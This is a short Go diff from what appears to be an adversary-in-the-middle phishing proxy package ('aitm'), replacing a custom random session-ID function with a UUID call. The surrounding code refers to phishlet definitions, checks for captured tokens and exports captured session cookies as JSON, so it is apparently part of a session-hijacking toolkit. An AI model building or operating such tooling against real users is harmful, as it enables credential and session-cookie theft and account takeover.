@@ -1,12 +1,12 @@
 package aitm
 
 import (
-	"crypto/rand"
-	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"strings"
 	"time"
+
+	"github.com/google/uuid"
 )
 
 // SessionStore is the persistence interface required by SessionService.
@@ -208,12 +208,8 @@ func (s *SessionService) Delete(id string) error {
 // NewSessionFromContext creates and persists a new session seeded from the
 // proxy context. Satisfies the request.SessionFactory interface.
 func (s *SessionService) NewSessionFromContext(ctx *ProxyContext) (*Session, error) {
-	id, err := newSessionID()
-	if err != nil {
-		return nil, fmt.Errorf("generating session ID: %w", err)
-	}
 	sess := &Session{
-		ID:         id,
+		ID:         uuid.New().String(),
 		RemoteAddr: ctx.ClientIP,
 		JA4Hash:    ctx.JA4Hash,
 		StartedAt:  time.Now(),
@@ -243,13 +239,6 @@ func (s *SessionService) IsComplete(sess *Session, def *PhishletDef) bool {
 	return sess.HasRequiredTokens(def)
 }
 
-func newSessionID() (string, error) {
-	buf := make([]byte, 16)
-	if _, err := rand.Read(buf); err != nil {
-		return "", err
-	}
-	return hex.EncodeToString(buf), nil
-}
 
 // ExportCookiesJSON returns the captured cookies for a session as a JSON byte
 // slice ready to be sent to the API caller or written to a file.
